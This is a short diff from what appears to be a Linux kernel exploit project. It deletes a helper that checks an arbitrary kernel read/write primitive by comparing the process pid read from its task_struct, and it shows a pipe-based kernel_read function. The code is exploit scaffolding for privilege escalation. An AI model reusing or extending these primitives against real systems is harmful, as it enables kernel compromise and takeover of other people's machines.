@@ -18,18 +18,6 @@ void init_kernel_read_write_pipe(int pipefd[2]) {
   SUCCESS("Kernel R/W pipe created (r=%d, w=%d)", pipefd[0], pipefd[1]);
 }
 
-void verify_arbitrary_read_write(int pipefd[2], struct task_struct *task_struct,
-                                 void *pid_address) {
-  pid_t real_pid = getpid();
-  pid_t kernel_pid = kernel_read_dword(pid_address, pipefd);
-  INFO("real pid = %d, kernel pid = %d", real_pid, kernel_pid);
-  if (real_pid != kernel_pid) {
-    ERROR("Arbitrary read/write verification failed");
-    exit(EXIT_FAILURE);
-  }
-  SUCCESS("Arbitrary read/write works");
-}
-
 bool kernel_read(void *addr, size_t len, void *ubuf, int pipefd[2]) {
   ssize_t written = write(pipefd[1], addr, len);
 
